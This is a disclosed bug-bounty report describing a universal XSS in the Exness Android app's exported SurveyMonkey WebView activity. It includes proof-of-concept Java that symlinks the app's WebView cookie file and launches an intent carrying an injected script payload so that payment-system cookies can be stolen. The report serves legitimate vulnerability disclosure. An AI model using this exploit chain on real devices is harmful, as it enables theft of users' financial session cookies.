# [com.exness.android.pa Android] Universal XSS in webview. Lead to steal user cookies

## Report Details
- **Report ID**: 532836
- **URL**: https://hackerone.com/reports/532836
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-04-09T20:11:31.259Z
- **Disclosed**: 2022-05-24T15:24:18.079Z

## Reporter
- **Username**: nearsecurity
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: exness

## Vulnerability Information
**Details:**
Package: com.exness.android.pa
Name: Exness
Version: 1.7.5-real-release


**Description**: Third-app may use exported activity to load any url in internal webView. This leads to steal cookies used in trading app, including  cookies of payment system

**Vulnerability description:**
Application has exported activity:
```java
        <activity android:name="com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity" android:screenOrientation="locked" android:windowSoftInputMode="adjustResize">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
            </intent-filter>
        </activity>
```
This activity get 2 extra string from intent:
``` java
       public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        Intent intent = getIntent();
        this.aKn = intent.getStringExtra("smSPageHTML");
        this.aKq = intent.getStringExtra("smSPageURL");
        if (this.aKn == null) {
            this.aKr = chn.m7508a(C3298a.ERROR_CODE_COLLECTOR_CLOSED, null);
            Log.d("SM_SDK_DEBUG", this.aKr.getDescription());
            mo19074b(this.aKr); 
        } else if (bundle == null) {
            getSupportFragmentManager().beginTransaction().add(16908290, chi.m12362c(this.aKq, this.aKn, true), chi.TAG).commit();
        }
    }
```
Then, the activity passes these strings to function chi.m12362c. This function create an intent of class chi (public class chi extends Fragment):
```java
    public static chi m12362c(String str, String str2, boolean z) {
        chi chi = new chi();
        Bundle bundle = new Bundle();
        bundle.putString("smSPageURL", str);
        bundle.putString("smSPageHTML", str2);
        bundle.putBoolean("smHasLoadedSPageHTML", z);
        chi.setArguments(bundle);
        return chi;
    }
```
Then created intent will executed.
Function onCreate of class chi:
```java
public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.aKo = false;
        this.aKp = false;
        this.aKn = null;
        Bundle arguments = getArguments();
        if (arguments != null) {
            this.aKq = arguments.getString("smSPageURL");
            this.aKo = arguments.getBoolean("smHasLoadedSPageHTML");
            if (this.aKo) {
                this.aKn = arguments.getString("smSPageHTML");
                m12353Gc(); // <-- pass to this function
                return;
            }
            new C48221().execute(new String[]{this.aKq});
        }
    }

```

After pass checks, strings of intent used in function m12353Gc:
```java
    public void m12353Gc() {
        if (getView() != null) {
            this.aKv = ProgressDialog.show(getActivity(), null, getString(C3294c.sm_loading_status));
            this.aKp = true;
            this.mWebView = (WebView) getView().findViewById(C3292a.sm_feedback_webview);
            this.mWebView.getSettings().setJavaScriptEnabled(true);
            this.mWebView.setWebViewClient(new C3296b(this, null));
            this.mWebView.loadDataWithBaseURL(this.aKq, this.aKn, null, "UTF-8", null);
        }
    }
```
In this way we load any url with our html code.

**Summary:**
Third app create intent with extra:
smSPageHTML - loaded html
smSPageURL - url context of webview
Then the Exness application will execute this html code on a background of activity where user need to enter his security code.

**Steal cookies:**
This actions does not require root priv.

Third app can create a symlink to cookie file. We use extention html because when it loads in webview, content of this file was interpreted as html:

```java
try {
            Runtime.getRuntime().exec("ln -s /data/data/com.exness.android.pa/app_webview/Cookies /data/data/pwn.pwn/pwn.html").waitFor(); // create symlink to Cookie file
            Runtime.getRuntime().exec("chmod 777 -R /data/data/pwn.pwn/").waitFor(); //set access to everyone
        } catch (Exception e) {
            e.printStackTrace();
            finish();
            return;
        }
        new File("/data/data/pwn.pwn/pwn.html").setReadable(true, false);
```

Then create an intent with malicious javascript, which setup an evil cookie.
After load the symlink, script in cookie will be executed and all of file will be send to server

POC app:
{F465510}

**Screenshots:**
Universal XSS;
code of apk:
```java
                        Intent steal = new Intent();
                        steal.setClassName("com.exness.android.pa", "com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity");
                        steal.putExtra("smSPageHTML", "<html><h1>Universal XSS</h1><script>var form = document.createElement(\"form\");\n" +
                                "    var element1 = document.createElement(\"input\");\n" +
                                "    form.method = \"POST\";\n" +
                                "    form.action = \"https://trade.mql5.com\";\n" +
                                "    element1.value=document.domain;;\n" +
                                "    element1.name=\"text\";\n" +
                                "    form.appendChild(element1);\n" +
                                "    document.body.appendChild(form);\n" +
                                "    form.submit();</script></html>");
                        steal.putExtra("smSPageURL", "https://trade.mql5.com/r/");
                        startActivity(steal);
```
{F465515}

Cookies:
"YOUR COOKIE:" - header of my page where the files are sent and echoed
{F465514}

Cookies of payanyway, qiwi, yandex money, moneta.ru, mql5:
{F465516}
{F465519}

## Impact

Can execute javascript in internal webview.
Can steal user's cookies of payment system and mql5.

## Attachments
- app-release.apk
- Screenshot_20190409-220841.png
- Screenshot_20190409-221332.png
- Screenshot_20190409-224030.png
- Screenshot_20190409-224316.png
